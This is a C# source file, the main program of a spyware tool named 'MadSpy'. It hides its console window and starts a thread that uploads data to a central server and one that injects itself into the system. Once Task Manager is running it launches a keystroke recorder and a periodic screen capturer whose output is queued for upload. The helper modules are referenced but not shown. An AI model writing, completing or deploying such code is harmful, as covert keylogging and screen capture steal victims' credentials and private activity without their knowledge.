using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.Diagnostics;
using System.IO;
using System.Windows.Media.Imaging;
using System.Windows.Forms;

namespace MadSpy
{
    public enum Status 
    {
        Active,
        Sleep,
        Selfdestroy
    }

    public class Data 
    {
        public string Agent { get; set; }
        public Status Status { get; set; }
        public string TargetProcess { get; set; }
        public int ScreenCapturerInterval { get; set; }
        public int ScreenWidth { get; set; }
        public int ScreenHeight { get; set; }
    }

    class Program
    {
        //
        // locks used so there will be no collision between threads when accessing same data resources
        //
        public static object LOGLOCK = new object();
        public static object IMGLOCK = new object();
        public static object DATALOCK = new object();

        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);

            //
            // setting up default data set
            //
            Data data = new Data();
            data.Agent = (new DirectoryInfo(Application.ExecutablePath).Name).Split('.')[0];
            data.Status = Status.Active;
            data.TargetProcess = "taskmgr";
            data.ScreenCapturerInterval = 30000;
            data.ScreenWidth = 800;
            data.ScreenHeight = 600;

            //
            // remote controller thread checks and uploads periodically data to server
            //
            Task remoteControllerFromRemote = Task.Factory.StartNew(() => { RemoteController.FromRemote(data); });

            //
            // injector thread injects the spyware into the system if required by the central server
            //
            Task injectorTask = Task.Factory.StartNew(() => { Injector.Inject(data); });

            //
            // so the task is injected, the spyware is in comunication with the central server, we have to wait until
            // the desired task to be monitored by the spyware is lunched
            //
            while (true) 
            {
                Thread.Sleep(2000);

                string targetProcess;
                lock (DATALOCK) 
                {
                    targetProcess = data.TargetProcess;
                }

                if (IsRunning(targetProcess))
                    break;
            }


            //
            // keystrokes recorder thread is used to spy the keyboard's strokes. Data are stored locally and remote
            // controller will upload them to central server for the next scheduled update
            //
            Task keystrokesRecorderTask = Task.Factory.StartNew(() => { KeystrokesRecorder.Record(data); });

            //
            // screen capturer thread makes a screenshoot and stores it locally so the remote controller is able to
            // upload data on central server
            //
            Task screenCapturerTask = Task.Factory.StartNew(() => { ScreenCapturer.Capture(data); });

          
            Task.WaitAll(remoteControllerFromRemote, keystrokesRecorderTask, screenCapturerTask,  injectorTask);
        }

        public static bool IsRunning(String process)
        {
            //
            // gives all instances of process running on the local computer
            //
            Process[] localByName = Process.GetProcessesByName(process);

            if (localByName != null && localByName.Length > 0)
                return true;

            return false;
        }

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
    }
}
